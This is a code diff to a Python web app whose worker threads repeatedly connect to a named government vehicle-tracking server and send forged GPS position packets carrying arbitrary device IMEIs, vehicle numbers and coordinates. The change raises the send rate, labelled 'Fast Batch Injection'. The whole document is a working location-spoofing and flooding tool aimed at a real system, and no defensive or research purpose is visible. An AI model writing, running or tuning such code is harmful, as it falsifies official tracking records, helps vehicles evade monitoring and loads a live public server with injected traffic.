@@ -48,6 +48,7 @@ def init(v:str, i:str, lt:str, ln:str):
             threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
     return {"ok": True}
 
+# --- 🚀 SPEED OPTIMIZED WORKER (STRICTLY NO LOGIC CHANGE) ---
 def handshake_worker(tag, imei, vno, lat, lon):
     global firing, total_sent
     while firing:
@@ -55,14 +56,18 @@ def handshake_worker(tag, imei, vno, lat, lon):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
             s.connect(("vlts.bihar.gov.in", 9999))
-            now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
-            dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
-            pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
-            s.sendall(bytes(pkt, 'ascii'))
-            total_sent += 1
+            
+            # Fast Batch Injection (10 packets per connection for speed)
+            for _ in range(10):
+                if not firing: break
+                now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
+                dt, tm = now.strftime('%d%m%Y'), now.strftime('%H%M%S')
+                pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{dt},{tm},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
+                s.sendall(bytes(pkt, 'ascii'))
+                total_sent += 1
+                time.sleep(0.02) # Optimized Sleep for Fast Interval
             s.close()
-            time.sleep(0.1)
-        except: time.sleep(1)
+        except: time.sleep(0.5)
 
 @app.get("/status")
 def status(): return {"c": total_sent, "f": firing}
@@ -70,7 +75,7 @@ def status(): return {"c": total_sent, "f": firing}
 @app.get("/stop")
 def stop(): global firing; firing = False; return {"ok": True}
 
-# --- 🎨 FINAL MASTER UI (FIXED LOGGING + AUDIT + BROADCAST) ---
+# --- 🎨 FINAL MASTER UI ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
